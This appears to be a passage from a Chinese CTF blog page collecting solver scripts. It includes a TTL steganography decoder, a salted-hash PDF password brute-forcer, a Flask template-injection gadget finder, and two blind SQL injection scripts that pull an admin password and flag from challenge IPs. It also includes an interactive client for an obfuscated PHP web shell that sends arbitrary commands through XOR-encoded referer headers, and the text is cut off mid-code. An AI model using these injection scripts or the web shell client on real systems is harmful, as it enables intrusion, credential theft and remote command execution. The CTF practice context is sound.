<h2 id="奇怪的TTL密码脚本-63-127-191-255"><a href="#奇怪的TTL密码脚本-63-127-191-255" class="headerlink" title="奇怪的TTL密码脚本(63 127 191 255)"></a>奇怪的TTL密码脚本(63 127 191 255)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">fp = open(<span class="string">'t.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">flag = binascii.unhexlify(flag)</span><br><span class="line">wp = open(<span class="string">'res.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br><span class="line"><span class="comment">#00111111 63</span></span><br><span class="line"><span class="comment">#01111111 127</span></span><br><span class="line"><span class="comment">#10111111 191</span></span><br><span class="line"><span class="comment">#11111111 255</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="PDF爆破hash密码"><a href="#PDF爆破hash密码" class="headerlink" title="PDF爆破hash密码"></a>PDF爆破hash密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/1 11:19</span></span><br><span class="line"><span class="comment"># @Author  : wulasite</span></span><br><span class="line"><span class="comment"># @Email   : wulasite@gmail.com</span></span><br><span class="line"><span class="comment"># @File    : readpdf.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser,PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextBoxHorizontal,LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># 用文件对象来创建一个pdf文档分析器</span></span><br><span class="line">        praser = PDFParser(fp)</span><br><span class="line">        <span class="comment"># 创建一个PDF文档</span></span><br><span class="line">        doc = PDFDocument()</span><br><span class="line">        <span class="comment"># 连接分析器 与文档对象</span></span><br><span class="line">        praser.set_document(doc)</span><br><span class="line">        doc.set_parser(praser)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提供初始化密码</span></span><br><span class="line">        <span class="comment"># 如果没有密码 就创建一个空的字符串</span></span><br><span class="line">        doc.initialize()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测文档是否提供txt转换，不提供就忽略</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> doc.is_extractable:</span><br><span class="line">            <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 创建PDf 资源管理器 来管理共享资源</span></span><br><span class="line">            rsrcmgr = PDFResourceManager()</span><br><span class="line">            <span class="comment"># 创建一个PDF设备对象</span></span><br><span class="line">            laparams = LAParams()</span><br><span class="line">            device = PDFPageAggregator(rsrcmgr, laparams=laparams)</span><br><span class="line">            <span class="comment"># 创建一个PDF解释器对象</span></span><br><span class="line">            interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line"></span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">            <span class="comment"># 循环遍历列表，每次处理一个page的内容</span></span><br><span class="line">            <span class="keyword">for</span> page <span class="keyword">in</span> doc.get_pages():</span><br><span class="line">                interpreter.process_page(page)</span><br><span class="line">                <span class="comment"># 接受该页面的LTPage对象</span></span><br><span class="line">                layout = device.get_result()</span><br><span class="line">                <span class="comment"># 这里layout是一个LTPage对象 里面存放着 这个page解析出的各种对象 一般包括LTTextBox, LTFigure, LTImage, LTTextBoxHorizontal 等等 想要获取文本就获得对象的text属性，</span></span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">                    <span class="keyword">if</span> isinstance(x, LTTextBoxHorizontal):</span><br><span class="line">                        res += x.get_text().strip()</span><br><span class="line">                        <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        print(<span class="string">"Searching word in "</span> + i)</span><br><span class="line">        pdf_text = convert_pdf_2_text(<span class="string">'./'</span>+i)</span><br><span class="line">        <span class="comment"># 这里的分隔符用空格和回车就够了，主要是分割出单词</span></span><br><span class="line">        pdf_text = re.split(<span class="string">' | \n'</span>, pdf_text)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            print(word)</span><br><span class="line">            enc_word = (word + <span class="string">'Salz!'</span>).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">            sha1_password = hashlib.sha1(enc_word).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line">                print(<span class="string">"Find the password :"</span> + word)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="flask模板注入"><a href="#flask模板注入" class="headerlink" title="flask模板注入"></a>flask模板注入</h2><p>检测有哪些含有os模板的模块可以用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> a.__name__ == <span class="string">'catch_warnings'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> a.__init__.__globals__.values():</span><br><span class="line">            <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys():</span><br><span class="line">                    <span class="keyword">print</span> num,item</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="base家族解密脚本-85-16-32-64"><a href="#base家族解密脚本-85-16-32-64" class="headerlink" title="base家族解密脚本(85\16\32\64)"></a>base家族解密脚本(85\16\32\64)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">find_decode = <span class="keyword">lambda</span> d , data : eval(<span class="string">f'base64.<span class="subst">&#123;d&#125;</span>(<span class="subst">&#123;data&#125;</span>)'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(data)</span>:</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> dir(base64): </span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">3</span>:] == <span class="string">'decode'</span>:</span><br><span class="line">      <span class="keyword">try</span>: </span><br><span class="line">        decode_data = find_decode(i,data)</span><br><span class="line">        chars = decode_data <span class="keyword">if</span> all(chr(x).isalpha() <span class="keyword">or</span> chr(x).isspace() <span class="keyword">for</span> x <span class="keyword">in</span> decode_data)<span class="keyword">else</span> <span class="literal">None</span> </span><br><span class="line">        <span class="keyword">if</span> chars != <span class="literal">None</span> : </span><br><span class="line">          <span class="keyword">return</span> <span class="string">f'Decoded String is: <span class="subst">&#123;chars.decode(<span class="string">"utf-8"</span>)&#125;</span>\nEncrypet was used is: <span class="subst">&#123;i[:<span class="number">3</span>]&#125;</span>'</span></span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#_______________ Test _________________</span></span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">b'NM&amp;qnZy;B1a%^M'</span>)) <span class="comment">#output : Hello World , b85</span></span><br><span class="line">print(decode(<span class="string">b'48656C6C6F20576F726C64'</span>))<span class="comment">#output : Hello World , b16</span></span><br><span class="line">print(decode(<span class="string">b'SGVsbG8gV29ybGQ='</span>))<span class="comment">#output : Hello World , b64</span></span><br><span class="line">print(decode(<span class="string">b'JBSWY3DPEBLW64TMMQ======'</span>))<span class="comment">#output : Hello World , b32</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://111.198.29.45:42192/zhuanxvlogin"</span></span><br><span class="line"><span class="comment"># url = "http://localhost:9090/zhuanxvlogin"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    admin_password = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">            guess = chr(n)</span><br><span class="line">            <span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            username = <span class="string">"aaa'\nor\n(select\nsubstring(password,"</span>+str(i)+<span class="string">",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"</span>+guess+<span class="string">"'\nor\n''like'"</span></span><br><span class="line">            data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: <span class="string">"a"</span>&#125;</span><br><span class="line">            req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">            <span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">                admin_password = admin_password + guess</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"admin password: "</span>+ admin_password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> admin_password</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second</span><span class="params">(admin_password)</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">            guess = chr(n)</span><br><span class="line">            <span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            username = <span class="string">"aa'\nor\n(select\nsubstring(welcometoourctf,"</span>+str(i)+<span class="string">",1)\nfrom\nFlag)\nlike\n'"</span>+guess+<span class="string">"'\nand\n''like'"</span></span><br><span class="line">            data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: admin_password&#125;</span><br><span class="line">            req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">            <span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">                flag = flag + guess</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"flag:"</span> + flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">admin_password = first()    </span><br><span class="line">second(admin_password)</span><br></pre></td></tr></table></figure>
<p>常见模板<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://47.94.221.39:8004//index.php?id=3%20%df%27and%20(case%20when(ord(mid((select%20group_concat(flag)from%20flag)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23"</span></span><br><span class="line">        res=requests.get(url.format(i,j))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'img'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(chr(j))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;q22!sa_web_sql_2245y2g44&#125;</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="php混淆攻击脚本"><a href="#php混淆攻击脚本" class="headerlink" title="php混淆攻击脚本"></a>php混淆攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span><span class="params">(seq,amount)</span>:</span></span><br><span class="line">    length = len(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error Input'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>,length<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span><span class="params">(amount)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += chr(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span><span class="params">(amount)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    lenKey = len(key)</span><br><span class="line">    lenTxt = len(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">"42f7"</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">"e9ac"</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">'http://111.198.29.45:44036/hack.php'</span></span><br><span class="line">defaultLang = <span class="string">'zh-CN'</span></span><br><span class="line">languages = [<span class="string">'zh-TW;q=0.%d'</span>,<span class="string">'zh-HK;q=0.%d'</span>,<span class="string">'en-US;q=0.%d'</span>,<span class="string">'en;q=0.%d'</span>]</span><br><span class="line">proxies = <span class="literal">None</span> <span class="comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = sorted(choicePart(range(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">','</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">'$i is %s'</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">'md5 head: %s'</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">'md5 tail: %s'</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">''</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(max(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">'Before insert payload:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,len(payload)<span class="number">-3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span 